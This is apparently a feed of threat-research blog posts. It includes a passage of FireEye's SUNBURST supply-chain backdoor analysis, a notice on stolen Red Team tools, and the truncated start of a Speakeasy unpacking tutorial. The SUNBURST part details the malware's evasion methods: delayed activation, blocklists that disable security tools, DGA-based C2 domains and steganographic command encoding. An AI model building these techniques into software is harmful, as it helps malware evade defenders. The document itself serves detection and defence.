  <i>IP Addresses located in Victim’s Country</i></p>
 <p>The attacker’s choice of IP addresses was also optimized to evade
  detection. The attacker primarily used only IP addresses originating
  from the same country as the victim, leveraging Virtual Private Servers.</p>
 <p>
  <b>Detection Opportunity</b></p>
 <p>This also presents some detection opportunities, as geolocating IP
  addresses used for remote access may show an impossible rate of travel
  if a compromised account is being used by the legitimate user and the
  attacker from disparate IP addresses. The attacker used multiple IP
  addresses per VPS provider, so once a malicious login from an unusual
  ASN is identified, looking at all logins from that ASN can help detect
  additional malicious activity. This can be done alongside baselining
  and normalization of ASN’s used for legitimate remote access to help
  identify suspicious activity.</p>
 <p>
  <i>Lateral Movement Using Different Credentials</i></p>
 <p>Once the attacker gained access to the network with compromised
  credentials, they moved laterally using multiple different
  credentials. The credentials used for lateral movement were always
  different from those used for remote access.</p>
 <p>
  <b>Detection Opportunity</b></p>
 <p>Organizations can use HX’s LogonTracker module to graph all logon
  activity and analyze systems displaying a one-to-many relationship
  between source systems and accounts. This will uncover any single
  system authenticating to multiple systems with multiple accounts, a
  relatively uncommon occurrence during normal business operations.</p>
 <p>
  <i>Temporary File Replacement and Temporary Task Modification</i></p>
 <p>The attacker used a temporary file replacement technique to remotely
  execute utilities: they replaced a legitimate utility with theirs,
  executed their payload, and then restored the legitimate original
  file. They similarly manipulated scheduled tasks by updating an
  existing legitimate task to execute their tools and then returning the
  scheduled task to its original configuration. They routinely removed
  their tools, including removing backdoors once legitimate remote
  access was achieved.</p>
 <p>
  <b>Detection Opportunity</b></p>
 <p>Defenders can examine logs for SMB sessions that show access to
  legitimate directories and follow a
  delete-create-execute-delete-create pattern in a short amount of time.
  Additionally, defenders can monitor existing scheduled tasks for
  temporary updates, using frequency analysis to identify anomalous
  modification of tasks. Tasks can also be monitored to watch for
  legitimate Windows tasks executing new or unknown binaries.</p>
 <p>This campaign’s post compromise activity was conducted with a high
  regard for operational security, in many cases leveraging dedicated
  infrastructure per intrusion. This is some of the best operational
  security that FireEye has observed in a cyber attack, focusing on
  evasion and leveraging inherent trust. However, it <i>can</i> be
  detected through persistent defense.</p>
 <h4>In-Depth Malware Analysis</h4>
 <p>SolarWinds.Orion.Core.BusinessLayer.dll
  (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin
  component of the Orion software framework that contains an obfuscated
  backdoor which communicates via HTTP to third party servers. After an
  initial dormant period of up to two weeks, it retrieves and executes
  commands, called “Jobs”, that include the ability to transfer and
  execute files, profile the system, and disable system services. The
  backdoor’s behavior and network protocol blend in with legitimate
  SolarWinds activity, such as by masquerading as the Orion Improvement
  Program (OIP) protocol and storing reconnaissance results within
  plugin configuration files. The backdoor uses multiple blocklists to
  identify forensic and anti-virus tools via processes, services, and drivers.</p>
 <h4>Unique Capabilities</h4>
 <ul> <li>Subdomain DomainName Generation Algorithm (DGA) is performed
    to vary DNS requests<ul> <li>CNAME responses point to the C2 domain
        for the malware to connect to</li> <li>The IP block of A record
        responses controls malware behavior</li> <li>DGA encoded machine
        domain name, used to selectively target victims</li> </ul> </li>
    <li>Command and control traffic masquerades as the legitimate Orion
    Improvement Program</li> <li>Code hides in plain site by using fake
    variable names and tying into legitimate components</li> </ul>
 <h4>Delivery and Installation</h4>
 <p>Authorized system administrators fetch and install updates to
  SolarWinds Orion via packages distributed by SolarWinds’s website. The
  update package
  CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp
  (02af7cec58b9a5da1c542b5a32151ba1) contains the
  SolarWinds.Orion.Core.BusinessLayer.dll described in this report.
  After installation, the Orion software framework executes the .NET
  program SolarWinds.BusinessLayerHost.exe to load plugins, including
  SolarWinds.Orion.Core.BusinessLayer.dll. This plugin contains many
  legitimate namespaces, classes, and routines that implement
  functionality within the Orion framework. Hidden in plain sight, the
  class
  SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer
  implements an HTTP-based backdoor. Code within the logically unrelated
  routine
  SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal
  invokes the backdoor code when the Inventory Manager plugin is loaded.</p>
 <p>SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds,
  using the certificate with serial number
  0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed. The file was signed
  on March 24, 2020.</p>
 <p>
  <i>Initialization</i></p>
 <p>On execution of the malicious
  SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize
  method the sample verifies that its lower case process name hashes to
  the value 17291806236368054941. This hash value is calculated as the
  standard FNV-1A 64-bit hash with an additional XOR by
  6605813339339102567 after computing the FNV-1A. This hash matches a
  process named &quot;solarwinds.businesslayerhost&quot;.</p>
 <p>The sample only executes if the filesystem write time of the
  assembly is at least 12 to 14 days prior to the current time; the
  exact threshold is selected randomly from an interval. The sample
  continues to check this time threshold as it is run by a legitimate
  recurring background task. Once the threshold is met, the sample
  creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as
  a guard that only one instance is running before reading
  SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and
  retrieving the XML field appSettings. The appSettings fields’ keys are
  legitimate values that the malicious logic re-purposes as a persistent
  configuration. The key ReportWatcherRetry must be any value other than
  3 for the sample to continue execution.</p>
 <p>The sample checks that the machine is domain joined and retrieves
  the domain name before execution continues. A userID is generated by
  computing the MD5 of a network interface MAC address that is up and
  not a loopback device, the domain name, and the registry value
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid. The
  userID is encoded via a custom XOR scheme after the MD5 is calculated.
  The ReportWatcherPostpone key of appSettings is then read from
  SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the
  initial, legitimate value. This operation is performed as the sample
  later bit packs flags into this field and the initial value must be
  known in order to read out the bit flags. The sample then invokes the
  method Update which is the core event loop of the sample.</p>
 <h4>DGA and Blocklists</h4>
 <p>The backdoor determines its C2 server using a Domain Generation
  Algorithm (DGA) to construct and resolve a subdomain of
  avsvmcloud[.]com. The Update method is responsible for initializing
  cryptographic helpers for the generation of these random C2
  subdomains. Subdomains are generated by concatenating a victim userId
  with a reversible encoding of the victims local machine domain name.
  The attacker likely utilizes the DGA subdomain to vary the DNS
  response to victims as a means to control the targeting of the
  malware. These subdomains are concatenated with one of the following
  to create the hostname to resolve:</p>
 <ul> <li>.appsync-api.eu-west-1[.]avsvmcloud[.]com</li>
  <li>.appsync-api.us-west-2[.]avsvmcloud[.]com</li>
  <li>.appsync-api.us-east-1[.]avsvmcloud[.]com</li>
  <li>.appsync-api.us-east-2[.]avsvmcloud[.]com</li> </ul>
 <p>Process name, service name, and driver path listings are obtained,
  and each value is hashed via the FNV-1a + XOR algorithm as described
  previously and checked against hardcoded blocklists. Some of these
  hashes have been brute force reversed as part of this analysis,
  showing that these routines are scanning for analysis tools and
  antivirus engine components. If a blocklisted process is found the
  Update routine exits and the sample will continue to try executing the
  routine until the blocklist passes. Blocklisted services are stopped
  by setting their
  HKLM\SYSTEM\CurrentControlSet\services\&lt;service_name&gt;\Start
  registry entries to value 4 for disabled. Some entries in the service
  list if found on the system may affect the DGA algorithms behavior in
  terms of the values generated. The list of stopped services is then
  bit-packed into the ReportWatcherPostpone key of the appSettings entry
  for the samples’ config file. If any service was transitioned to
  disabled the Update method exits and retries later. The sample
  retrieves a driver listing via the WMI query Select * From
  Win32_SystemDriver. If any blocklisted driver is seen the Update
  method exits and retries. If all blocklist tests pass, the sample
  tries to resolve api.solarwinds.com to test the network for connectivity.</p>
 <h4>Network Command and Control (C2)</h4>
 <p>If all blocklist and connectivity checks pass, the sample starts
  generating domains in a while loop via its DGA. The sample will delay
  for random intervals between the generation of domains; this interval
  may be any random value from the ranges 1 to 3 minutes, 30 to 120
  minutes, or on error conditions up to 420 to 540 minutes (9 hours).
  The DNS A record of generated domains is checked against a hardcoded
  list of IP address blocks which control the malware’s behavior.
  Records within the following ranges will terminate the malware and
  update the configuration key ReportWatcherRetry to a value that
  prevents further execution:</p>
 <ul> <li>10.0.0.0/8</li> <li>172.16.0.0/12</li> <li>192.168.0.0/16</li>
  <li>224.0.0.0/3</li> <li>fc00:: - fe00::</li> <li>fec0:: - ffc0::</li>
    <li>ff00:: - ff00::</li> <li>20.140.0.0/15</li>
  <li>96.31.172.0/24</li> <li>131.228.12.0/22</li>
  <li>144.86.226.0/24</li> </ul>
 <p>Once a domain has been successfully retrieved in a CNAME DNS
  response the sample will spawn a new thread of execution invoking the
  method HttpHelper.Initialize which is responsible for all C2
  communications and dispatching. The HTTP thread begins by delaying for
  a configurable amount of time that is controlled by the SetTime
  command. The HTTP thread will delay for a minimum of 1 minute between
  callouts. The malware uses HTTP GET or HTTP POST requests. If the
  sample is attempting to send outbound data the content-type HTTP
  header will be set to &quot;application/octet-stream&quot; otherwise
  to &quot;application/json&quot;.</p>
 <p>A JSON payload is present for all HTTP POST and PUT requests and
  contains the keys “userId”, “sessionId”, and “steps”. The “steps”
  field contains a list of objects with the following keys: “Timestamp”,
  “Index”, “EventType”, “EventName”, “DurationMs”, “Succeeded”, and
  “Message”. The JSON key “EventType” is hardcoded to the value “Orion”,
  and the “EventName” is hardcoded to “EventManager”. Malware response
  messages to send to the server are DEFLATE compressed and
  single-byte-XOR encoded, then split among the “Message” fields in the
  “steps” array. Each “Message” value is Base64 encoded separately. Not
  all objects in the “steps” array contribute to the malware message –
  the integer in the “Timestamp” field must have the 0x2 bit set to
  indicate that the contents of the “Message” field are used in the
  malware message. Step objects whose bit 0x2 is clear in the Timestamp
  field contain random data and are discarded when assembling the
  malware response.</p>
 <h4>Steganography</h4>
 <p>In observed traffic these HTTP response bodies attempt to appear
  like benign XML related to .NET assemblies, but command data is
  actually spread across the many GUID and HEX strings present. Commands
  are extracted from HTTP response bodies by searching for HEX strings
  using the following regular expression:
  &quot;\{[0-9a-f-]{36}\}&quot;|&quot;[0-9a-f]{32}&quot;|&quot;[0-9a-f]{16}&quot;.
  Command data is spread across multiple strings that are disguised as
  GUID and HEX strings. All matched substrings in the response are
  filtered for non HEX characters, joined together, and HEX-decoded. The
  first DWORD value shows the actual size of the message, followed
  immediately with the message, with optional additional junk bytes
  following. The extracted message is single-byte XOR decoded using the
  first byte of the message, and this is then DEFLATE decompressed. The
  first character is an ASCII integer that maps to the JobEngine enum,
  with optional additional command arguments delimited by space characters.</p>
 <p>Commands are then dispatched to a JobExecutionEngine based upon the
  command value as described next.</p>
 <h4>Supported Commands</h4>
 <table border="1" cellspacing="0" cellpadding="0" width="686"> <tbody>
    <tr>
      <td width="176" valign="top"><p>
          <b>
            <u>Command</u></b></p> </td> <td width="55" valign="top"><p>
          <b>
            <u>Value</u></b></p> </td> <td width="455" valign="top"><p>
          <b>
            <u>Operation</u></b></p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>Idle</p> </td> <td width="55"
        valign="top"><p>0</p> </td> <td width="455" valign="top"><p>No
        operation</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>Exit</p> </td> <td width="55"
        valign="top"><p>1</p> </td> <td width="455"
          valign="top"><p>Terminate the current thread.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>SetTime</p> </td> <td width="55"
        valign="top"><p>2</p> </td> <td width="455" valign="top"><p>Sets
          the delay time between main event loop executions Delay is in
          seconds, and varies random between [.9 * &lt;delay&gt;, 1.1 *
          &lt;delay&gt;].          If the delay is &lt; 300 it is
          doubled on the next execution through the loop, this means it
          should settle onto an interval of around [5, 10] minutes.
                  There is a second, unrelated delay routine that delays
          for a random interval between [16hrs, 83hrs]</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>CollectSystemDescription</p> </td>
        <td width="55" valign="top"><p>3</p> </td> <td width="455"
          valign="top"><p>Profile the local system including hostname,
          username, OS version, MAC addresses, IP address, DHCP
          configuration, and domain information.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>UploadSystemDescription</p> </td>
        <td width="55" valign="top"><p>4</p> </td> <td width="455"
          valign="top"><p>Perform a HTTP request to the specified URL,
          parse the results and compare components against unknown
          hashed values. Format a report and send to the C2 server.</p>
      </td> </tr>
    <tr>
      <td width="176" valign="top"><p>RunTask</p> </td> <td width="55"
        valign="top"><p>5</p> </td> <td width="455"
          valign="top"><p>Starts a new process with the given file path
          and arguments</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>GetProcessByDescription</p> </td>
        <td width="55" valign="top"><p>6</p> </td> <td width="455"
          valign="top"><p>Returns a process listing. If no arguments are
          provided returns just the PID and process name.        If an
          argument is provided it also returns the parent PID and
          username and domain for the process owner.</p> <p> </p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>KillTask</p> </td> <td width="55"
        valign="top"><p>7</p> </td> <td width="455"
          valign="top"><p>Terminate the given process, by PID.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>GetFileSystemEntries</p> </td> <td
        width="55" valign="top"><p>8</p> </td> <td width="455"
          valign="top"><p>Given a path and an optional match pattern
          recursively list files and directories</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>WriteFile</p> </td> <td width="55"
        valign="top"><p>9</p> </td> <td width="455"
          valign="top"><p>Given a file path and a Base64 encoded string
          write the contents of the Base64 decoded string to the given
          file path. Write using append mode. Delay for [1s, 2s] after
          writing is done.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>FileExists</p> </td> <td
        width="55" valign="top"><p>10</p> </td> <td width="455"
          valign="top"><p>Tests whether the given file path exists.</p>
      </td> </tr>
    <tr>
      <td width="176" valign="top"><p>DeleteFile</p> </td> <td
        width="55" valign="top"><p>11</p> </td> <td width="455"
          valign="top"><p>Deletes the specified file path.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>GetFileHash</p> </td> <td
        width="55" valign="top"><p>12</p> </td> <td width="455"
          valign="top"><p>Compute the MD5 of a file at a given path and
          return result as a HEX string. If an argument is provided, it
          is the expected MD5 hash of the file and returns an error if
          the calculated MD5 differs.</p> <p> </p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>ReadRegistryValue</p> </td> <td
        width="55" valign="top"><p>13</p> </td> <td width="455"
          valign="top"><p>Arbitrary registry read from one of the
          supported hives</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>SetRegistryValue</p> </td> <td
        width="55" valign="top"><p>14</p> </td> <td width="455"
          valign="top"><p>Arbitrary registry write from one of the
          supported hives.</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>DeleteRegistryValue</p> </td> <td
        width="55" valign="top"><p>15</p> </td> <td width="455"
          valign="top"><p>Arbitrary registry delete from one of the
          supported hives</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>GetRegistrySubKeyAndValueNames</p>
        <p> </p> </td> <td width="55" valign="top"><p>16</p> </td> <td
        width="455" valign="top"><p>Returns listing of subkeys and value
          names beneath the given registry path</p> </td> </tr>
    <tr>
      <td width="176" valign="top"><p>Reboot</p> </td> <td width="55"
        valign="top"><p>17</p> </td> <td width="455"
          valign="top"><p>Attempts to immediately trigger a system
        reboot.</p> </td> </tr></tbody></table>
 <h4>Indicators and Detections to Help the Community</h4>
 <p>To empower the community to detect this supply chain backdoor, we
  are publishing indicators and detections to help organizations
  identify this backdoor and this threat actor. The signatures are a mix
  of Yara, IOC, and Snort formats.</p>
 <p>A list of the detections and signatures are available on the FireEye
  GitHub repository found <a
  href="https://github.com/fireeye/sunburst_countermeasures">here</a>.
  We are releasing detections and will continue to update the public
  repository with overlapping detections for host and network-based
  indicators as we develop new or refine existing ones. We have found
  multiple hashes with this backdoor and we will post updates of those hashes.</p>
 <h4>MITRE ATT&amp;CK Techniques Observed</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="308" valign="top"><p>
          <b>
            <u>ID</u></b></p> </td> <td width="315" valign="top"><p>
          <b>
            <u>Description</u></b></p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1012</p> </td> <td width="315"
          valign="top"><p>Query Registry</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1027</p> </td> <td width="315"
          valign="top"><p>Obfuscated Files or Information</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1057</p> </td> <td width="315"
          valign="top"><p>Process Discovery</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1070.004</p> </td> <td
        width="315" valign="top"><p>File Deletion</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1071.001</p> </td> <td
        width="315" valign="top"><p>Web Protocols</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1071.004</p> </td> <td
        width="315" valign="top"><p>Application Layer Protocol: DNS</p>
      </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1083</p> </td> <td width="315"
          valign="top"><p>File and Directory Discovery</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1105</p> </td> <td width="315"
          valign="top"><p>Ingress Tool Transfer</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1132.001</p> </td> <td
        width="315" valign="top"><p>Standard Encoding</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1195.002</p> </td> <td
        width="315" valign="top"><p>Compromise Software Supply
        Chain<u></u></p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1518</p> </td> <td width="315"
          valign="top"><p>Software Discovery</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1518.001</p> </td> <td
        width="315" valign="top"><p>Security Software Discovery</p>
      </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1543.003</p> </td> <td
        width="315" valign="top"><p>Windows Service</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1553.002</p> </td> <td
        width="315" valign="top"><p>Code Signing</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1568.002</p> </td> <td
        width="315" valign="top"><p>Domain Generation Algorithms</p>
      </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1569.002</p> </td> <td
        width="315" valign="top"><p>Service Execution</p> </td> </tr>
    <tr>
      <td width="308" valign="top"><p>T1584</p> </td> <td width="315"
          valign="top"><p>Compromise Infrastructure</p> </td> </tr></tbody></table>
 <h4>Immediate Mitigation Recommendations</h4>
 <p>Prior to following SolarWind’s recommendation to utilize Orion
  Platform release 2020.2.1 HF 1, which is currently available via the
  SolarWinds Customer Portal, organizations should consider preserving
  impacted devices and building new systems using the latest versions.
  Applying an upgrade to an impacted box could potentially overwrite
  forensic evidence as well as leave any additional backdoors on the
  system. In addition, SolarWinds has released additional mitigation and
  hardening instructions <a href="https://www.solarwinds.com/securityadvisory">here</a>.</p>
 <p>In the event you are unable to follow SolarWinds’ recommendations,
  the following are immediate mitigation techniques that could be
  deployed as first steps to address the risk of trojanized SolarWinds
  software in an environment. If attacker activity is discovered in an
  environment, we recommend conducting a comprehensive investigation and
  designing and executing a remediation strategy driven by the
  investigative findings and details of the impacted environment.</p>
 <ul> <li>Ensure that SolarWinds servers are isolated / contained until
    a further review and investigation is conducted. This should include
    blocking all Internet egress from SolarWinds servers.</li> <li>If
    SolarWinds infrastructure is not isolated, consider taking the
    following steps:<ul> <li>Restrict scope of connectivity to endpoints
        from SolarWinds servers, especially those that would be
        considered Tier 0 / crown jewel assets</li> <li>Restrict the
        scope of accounts that have local administrator privileged on
        SolarWinds servers.</li> <li>Block Internet egress from servers
        or other endpoints with SolarWinds software.</li> </ul> </li>
    <li>Consider (at a minimum) changing passwords for accounts that
    have access to SolarWinds servers / infrastructure. Based upon
    further review / investigation, additional remediation measures may
    be required.</li> <li>If SolarWinds is used to managed networking
    infrastructure, consider conducting a review of network device
    configurations for unexpected / unauthorized modifications. Note,
    this is a proactive measure due to the scope of SolarWinds
    functionality, not based on investigative findings.</li> </ul>
 <h4>Acknowledgements</h4>
 <p>This blog post was the combined effort of numerous personnel and
  teams across FireEye coming together. Special thanks to:</p>
 <p>Andrew Archer, Doug Bienstock, Chris DiGiamo, Glenn Edwards, Nick
  Hornick, Alex Pennino, Andrew Rector, Scott Runnels, Eric Scales,
  Nalani Fraser, Sarah Jones, John Hultquist, Ben Read, Jon Leathery,
  Fred House, Dileep Jallepalli, Michael Sikorski, Stephen Eckels,
  William Ballenthin, Jay Smith, Alex Berry, Nick Richard, Isif
  Ibrahima, Dan Perez, Marcin Siedlarz, Ben Withnell, Barry Vengerik,
  Nicole Oppenheim, Ian Ahl, Andrew Thompson, Matt Dunwoody, Evan Reese,
  Steve Miller, Alyssa Rahman, John Gorman, Lennard Galang, Steve Stone,
  Nick Bennett, Matthew McWhirt, Mike Burns, Omer Baig.</p>
 <p>Also special thanks to Nick Carr, Christopher Glyer, and Ramin
  Nafisi from Microsoft.</p>
http://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html2020-12-13T22:00:00.000Z2020-12-21T20:36:24.858ZUnauthorized Access of FireEye Red Team Toolsnoemail@noemail.orgFireEye<h4>Overview</h4>
 <p>A highly sophisticated state-sponsored adversary stole FireEye Red
  Team tools. Because we believe that an adversary possesses these
  tools, and we do not know whether the attacker intends to use the
  stolen tools themselves or publicly disclose them, FireEye is
  releasing hundreds of countermeasures with this blog post to enable
  the broader security community to protect themselves against these
  tools. We have incorporated the countermeasures in our FireEye
  products—and shared these countermeasures with partners, government
  agencies—to significantly limit the ability of the bad actor to
  exploit the Red Team tools.</p>
 <p>
  <b>You can find a list of the countermeasures on the FireEye GitHub
    repository found </b>
  <a href="https://github.com/fireeye/red_team_tool_countermeasures"><b>HERE</b></a>
  <b>.</b></p>
 <h4>Red Team Tools and Techniques</h4>
 <p>A Red Team is a group of security professionals authorized and
  organized to mimic a potential adversary’s attack or exploitation
  capabilities against an enterprise’s security posture. Our Red Team’s
  objective is to improve enterprise cyber security by demonstrating the
  impacts of successful attacks and by showing the defenders (i.e., the
  Blue Team) how to counter them in an operational environment. We have
  been performing Red Team assessments for customers around the world
  for over 15 years. In that time, we have built up a set of scripts,
  tools, scanners, and techniques to help improve our clients’ security
  postures. Unfortunately, these tools were stolen by a highly
  sophisticated attacker.</p>
 <p>The stolen tools range from simple scripts used for automating
  reconnaissance to entire frameworks that are similar to publicly
  available technologies such as CobaltStrike and Metasploit. Many of
  the Red Team tools have already been released to the community and are
  already distributed in our open-source virtual machine, <a href="https://github.com/fireeye/commando-vm">CommandoVM</a>.</p>
 <p>Some of the tools are publicly available tools modified to evade
  basic security detection mechanisms. Other tools and frameworks were
  developed in-house for our Red Team.</p>
 <h4>No Zero-Day Exploits or Unknown Techniques</h4>
 <p>The Red Team tools stolen by the attacker did not contain zero-day
  exploits. The tools apply well-known and documented methods that are
  used by other red teams around the world. Although we do not believe
  that this theft will greatly advance the attacker’s overall
  capabilities, FireEye is doing everything it can to prevent such a scenario. </p>
 <p>It’s important to note that FireEye has not seen these tools
  disseminated or used by any adversaries, and we will continue to
  monitor for any such activity along with our security partners.</p>
 <h4>Detections to Help the Community</h4>
 <p>To empower the community to detect these tools, we are publishing
  countermeasures to help organizations identify these tools if they
  appear in the wild. In response to the theft of our Red Team tools, we
  have released <i>hundreds</i> of countermeasures for publicly
  available technologies like OpenIOC, Yara, Snort, and ClamAV.</p>
 <p>A list of the countermeasure is available on the FireEye GitHub
  repository found <a
  href="https://github.com/fireeye/red_team_tool_countermeasures">here</a>.
  We are releasing detections and will continue to update the public
  repository with overlapping countermeasures for host, network, and
  file-based indicators as we develop new or refine existing detections.
  In addition, we are publishing a list of CVEs that need to be
  addressed to limit the effectiveness of the Red Team tools on the
  GitHub page.</p>
 <h4>FireEye Products Protect Customers Against These Tools</h4>
 <p>Teams across FireEye have worked to build the countermeasures to
  protect our customers and the broader community. We have incorporated
  these countermeasures into our products and shared these
  countermeasures with our partners, including the Department of
  Homeland Security, who have incorporated the countermeasures into
  their products to provide broad coverage for the community.</p>
 <p>More information on the detection signatures available can be found
  in the <a
    href="https://github.com/fireeye/red_team_tool_countermeasures">GitHub repository</a>.</p>
http://www.fireeye.com/blog/threat-research/2020/12/unauthorized-access-of-fireeye-red-team-tools.html2020-12-08T21:00:00.000Z2020-12-08T21:12:07.936ZUsing Speakeasy Emulation Framework Programmatically to Unpack Malwarenoemail@noemail.orgJames T. Bennett<p>
  <a
    href="https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-andrew-davis">Andrew
  Davis</a> recently <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/08/emulation-of-malicious-shellcode-with-speakeasy.html">announced
    the public release</a> of his new Windows emulation framework named
    <a href="https://github.com/fireeye/speakeasy">Speakeasy</a>. While
  the introductory blog post focused on using Speakeasy as an automated
  malware sandbox of sorts, this entry will highlight another powerful
  use of the framework: automated malware unpacking. I will demonstrate,
  with code examples, how Speakeasy can be used programmatically to:</p>
 <ul> <li>Bypass unsupported Windows APIs to continue emulation and
  unpacking</li> <li>Save virtual addresses of dynamically allocated
    code using API hooks</li> <li>Surgically direct execution to key
    areas of code using code hooks</li> <li>Dump an unpacked PE from
    emulator memory and fix its section headers</li> <li>Aid in
    reconstruction of import tables by querying Speakeasy for symbolic
  information</li> </ul>
 <h4>Initial Setup</h4>
 <p>One approach to interfacing with Speakeasy is to create a subclass
  of Speakeasy’s <a
      href="https://github.com/fireeye/speakeasy/blob/master/speakeasy/speakeasy.py"><span
  class="code">Speakeasy</span></a> class. Figure 1 shows a Python code
  snippet that sets up such a class that will be expanded in upcoming examples.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">import speakeasy</span></p> <p>
          <span class="code">class
            MyUnpacker(speakeasy.Speakeasy):<br />      def
            __init__(self, config=None):<br />         
            super(MyUnpacker, self).__init__(config=config)</span></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: Creating a Speakeasy subclass</span></p>
 <p>The code in Figure 1 accepts a Speakeasy configuration dictionary
  that may be used to override the default configuration. Speakeasy
  ships with <a
    href="https://github.com/fireeye/speakeasy/tree/master/speakeasy/configs">several
    configuration files</a>. The <span class="code">Speakeasy</span>
  class is a wrapper class for an underlying emulator class. The
  emulator class is chosen automatically when a binary is loaded based
  on its PE headers or is specified as shellcode. Subclassing <span
  class="code">Speakeasy</span> makes it easy to access, extend, or
  modify interfaces. It also facilitates reading and writing stateful
  data before, during, and after emulation.</p>
 <h4>Emulating a Binary</h4>
 <p>Figure 2 shows how to load a binary into the Speakeasy emulator.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">self.module =
      self.load_module(filename)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: Loading the binary into the emulator</span></p>
 <p>The <span class="code">load_module</span> function returns a <span
  class="code">PeFile</span> object for the provided binary on disk. It
  is an instance of the <span class="code">PeFile</span> class defined
  in <a
      href="https://github.com/fireeye/speakeasy/blob/master/speakeasy/windows/common.py"><span
  class="code">speakeasy/windows/common.py</span></a>, which is
  subclassed from <a
  href="https://github.com/erocarrera/pefile/blob/master/pefile.py">pefile</a>’s
    <span class="code">PE</span> class. Alternatively, you can provide
  the bytes of a binary using the <span class="code">data</span>
  parameter rather than specifying a file name. Figure 3 shows how to
  emulate a loaded binary.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">self.run_module(self.module)</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: Starting emulation</span></p>
 <h4>API Hooks</h4>
 <p>The Speakeasy framework ships with support for hundreds of Windows
  APIs with more being added frequently. This is accomplished via Python
  API <i>handlers</i> defined in appropriate files in the <a
      href="https://github.com/fireeye/speakeasy/tree/master/speakeasy/winenv/api"><span
  class="code">speakeasy/winenv/api</span></a> directory. API
  <i>hooks</i> can be installed to have your own code executed when
  particular APIs are called during emulation. They can be installed for
  any API, regardless of whether a handler exists or not. An API hook
  can be used to override an existing handler and that handler can
  optionally be invoked from your hook. The API hooking mechanism in
  Speakeasy provides flexibility and control over emulation. Let’s
  examine a few uses of API hooking within the context of emulating
  unpacking code to retrieve an unpacked payload.</p>
 <h4>Bypassing Unsupported APIs</h4>
 <p>When Speakeasy encounters an unsupported Windows API call, it stops
  emulation and provides the name of the API function that is not
  supported. If the API function in question is not critical for
  unpacking the binary, you can add an API hook that simply returns a
  value that allows execution to continue. For example, a recent
  sample’s unpacking code contained API calls that had no effect on the
  unpacking process. One such API call was to <span
  class="code">GetSysColor</span>. In order to bypass this call and
  allow execution to continue, an API hook may be added as shown in
  Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span
          class="code">self.add_api_hook(self.getsyscolor_hook,<br />   
                          'user32',<br />                   
          'GetSysColor',<br />                    argc=1<br />         
                    )</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: Adding an API hook</span></p>
 <p>According to <a
  href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsyscolor">MSDN</a>,
  this function takes 1 parameter and returns an RGB color value
  represented as a <span class="code">DWORD</span>. If the calling
  convention for the API function you are hooking is not <span
  class="code">stdcall</span>, you can specify the calling convention in
  the optional <span class="code">call_conv parameter</span>. The
  calling convention constants are defined in the <a
      href="https://github.com/fireeye/speakeasy/blob/master/speakeasy/winenv/arch.py"><span
  class="code">speakeasy/common/arch.py</span></a> file. Because the
    <span class="code">GetSysColor</span> return value does not impact
  the unpacking process, we can simply return <span
  class="code">0</span>. Figure 5 shows the definition of the <span
  class="code">getsyscolor_hook</span> function specified in Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">def getsyscolor_hook(self, emu, api_name,
